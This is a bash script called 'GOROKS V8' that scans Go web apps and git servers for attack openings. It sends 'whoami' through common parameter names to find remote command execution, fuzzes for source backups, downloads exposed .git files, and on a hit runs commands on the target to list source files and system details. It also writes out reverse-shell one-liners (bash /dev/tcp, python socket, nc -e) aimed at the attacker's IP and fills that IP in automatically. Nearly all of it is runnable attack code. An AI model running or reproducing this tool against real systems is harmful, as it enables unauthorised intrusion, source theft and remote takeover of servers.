#!/usr/bin/env bash
set -euo pipefail

echo "[+] GOROKS V8 ENGINE START"

TARGET="${1:?Usage: $0 <target>}"
OUTPUT="goroks_v8_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT"

BASE=$(echo "$TARGET" | sed 's:/*$::')

echo "[+] Target: $BASE"
echo "[+] Output: $OUTPUT"

# =========================
# 0. Dependency Check
# =========================
for bin in curl jq grep awk sed ffuf; do
    command -v "$bin" >/dev/null || {
        echo "[!] Missing dependency: $bin (apt install ffuf jq)"
        exit 1
    }
done

# =========================
# 1. Go Web Fingerprinting + RCE Detection
# =========================
echo "[+] Go app fingerprinting..."

curl -skIL "$BASE" > "$OUTPUT/headers.txt"
curl -skL "$BASE" | head -n 200 > "$OUTPUT/body.txt"

TECH="unknown"
RCE_VECTOR=""

# Go framework detection
if grep -Eqi "gin|fiber|echo|gorilla|chi" "$OUTPUT/body.txt"; then
    TECH="go_web"
elif grep -Eqi "gitlab|gitea|gogs" "$OUTPUT/headers.txt" "$OUTPUT/body.txt"; then
    TECH="git_server"
fi

echo "$TECH" > "$OUTPUT/tech.txt"

# RCE parameter discovery
RCE_PARAMS=(cmd command exec payload run shell input query test)
for param in "${RCE_PARAMS[@]}"; do
    RESP=$(curl -sk -m 3 "$BASE/?$param=whoami" 2>/dev/null | head -c 100)
    if [[ "$RESP" =~ uid=|root|www-data ]]; then
        echo "[+] 🔥 RCE FOUND → ?$param="
        RCE_VECTOR="$BASE/?$param="
        echo "$RCE_VECTOR" > "$OUTPUT/rce_confirmed.txt"
        break
    fi
done

# =========================
# 2. Go Source Code Seeds
# =========================
echo "[+] Building Go source seeds..."

cat > "$OUTPUT/seeds.txt" << EOF
$BASE/main.go $BASE/app.go $BASE/handlers.go $BASE/server.go
$BASE/routes.go $BASE/api.go $BASE/go.mod $BASE/Dockerfile
$BASE/.env $BASE/config.yaml $BASE/users/sign_in $BASE/explore
EOF

# =========================
# 3. Go Backup Intelligence
# =========================
echo "[+] Go backup hunting..."

GO_BACKUPS="main.go~ main.go.bak main.go.old main.go.swp handlers.go~
app.go.bak server.go.old go.mod.bak Dockerfile~ .env.old"

ffuf -u "$BASE/FUZZ" -w <(echo "$GO_BACKUPS") \
    -o "$OUTPUT/backups.json" -mc 200,301 -t 100 -s || true

# =========================
# 4. Git Repository Intelligence
# =========================
echo "[+] Git source extraction..."

if curl -sf "$BASE/.git/HEAD" | grep -q "ref:"; then
    echo "[+] 📂 Git FULLY EXPOSED"
    curl -sk "$BASE/.git/config" > "$OUTPUT/git_config.txt"
    curl -sk "$BASE/.git/HEAD" > "$OUTPUT/git_HEAD.txt"
    
    # Extract recent commits
    curl -sk "$BASE/.git/logs/HEAD" | tail -50 > "$OUTPUT/git_commits.txt"
fi

# =========================
# 5. RCE Exploitation (if found)
# =========================
if [[ -n "$RCE_VECTOR" ]]; then
    echo "[+] 🦠 RCE EXPLOITATION ACTIVE"
    
    # Source code dump
    curl -sk "${RCE_VECTOR}find / -name '*.go' 2>/dev/null | head -20" > "$OUTPUT/rce_go_files.txt"
    curl -sk "${RCE_VECTOR}find /proc/self/cwd -name '*.go' 2>/dev/null" > "$OUTPUT/rce_app_files.txt"
    
    # System intel
    curl -sk "${RCE_VECTOR}id;uname -a;pwd" > "$OUTPUT/rce_system.txt"
    
    # Reverse shell payloads
    cat > "$OUTPUT/revshells.txt" << 'EOF'
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
nc -e /bin/sh YOUR_IP 4444
EOF
fi

# =========================
# 6. Go-Specific API Mining
# =========================
echo "[+] Go API endpoints..."

> "$OUTPUT/go_apis.txt"
echo "api/v1/health api/v1/debug api/v1/metrics /debug/pprof" >> "$OUTPUT/go_apis.txt"
grep -rEi "(POST|GET|PUT|DELETE)[[:space:]]+/" "$OUTPUT/" 2>/dev/null >> "$OUTPUT/go_apis.txt" || true

# =========================
# 7. Attack Surface Graph
# =========================
echo "[+] Attack graph..."

cat "$OUTPUT/seeds.txt" > "$OUTPUT/nodes.txt"

> "$OUTPUT/attack_edges.txt"
while read -r node; do
    echo "$node -> RCE (if $RCE_VECTOR)" >> "$OUTPUT/attack_edges.txt"
    echo "$node -> Git Leak (if .git/HEAD)" >> "$OUTPUT/attack_edges.txt"
done < "$OUTPUT/nodes.txt"

# =========================
# 8. Risk Scoring (Go Specific)
# =========================
echo "[+] Go risk scoring..."

CRITICAL=0; HIGH=0; MEDIUM=0

[[ -f "$OUTPUT/rce_confirmed.txt" ]] && ((CRITICAL++))
[[ -f "$OUTPUT/git_config.txt" ]] && ((HIGH++))
[[ $(jq -r '.[].status_code | select(.==200 or .==301) | length' "$OUTPUT/backups.json" 2>/dev/null || echo 0) -gt 0 ]] && ((HIGH++))

cat > "$OUTPUT/risk.txt" << EOF
CRITICAL: $CRITICAL (RCE)
HIGH: $HIGH (Git/Source)
MEDIUM: 1 (API Surface)
LOW: 2 (Default Endpoints)
EOF

# =========================
# 9. GOROKS Report
# =========================
echo "[+] GOROKS Report..."

cat > "$OUTPUT/goroks_report.txt" << EOF
GOROKS V8 PENTEST REPORT
========================
TARGET: $BASE
TECH: $(cat "$OUTPUT/tech.txt")
RCE: $([[ -f "$OUTPUT/rce_confirmed.txt" ]] && echo "✅ ACTIVE" || echo "❌ None")

ATTACK SURFACE:
- Source Leaks: $(ls "$OUTPUT/" | grep -E "\.go|\.bak|\.swp" | wc -l)
- Git Status: $([[ -f "$OUTPUT/git_config.txt" ]] && echo "✅ EXPOSED" || echo "❌ Secure")
- Risk Score:
$(cat "$OUTPUT/risk.txt")

EXPLOITATION:
$(if [[ -n "$RCE_VECTOR" ]]; then
    echo "RCE Vector: $RCE_VECTOR"
    echo "Source Dump: $OUTPUT/rce_go_files.txt"
    echo "Revshell: cat $OUTPUT/revshells.txt | sed 's/YOUR_IP/$(curl ifconfig.me)/'"
fi
)

EVIDENCE FILES:
$(ls -la "$OUTPUT/" | head -15)
EOF

echo "[✓] GOROKS COMPLETE → $OUTPUT/goroks_report.txt"
echo "Total files: $(ls "$OUTPUT/" | wc -l)"
tree "$OUTPUT/" 2>/dev/null || ls -la "$OUTPUT/"
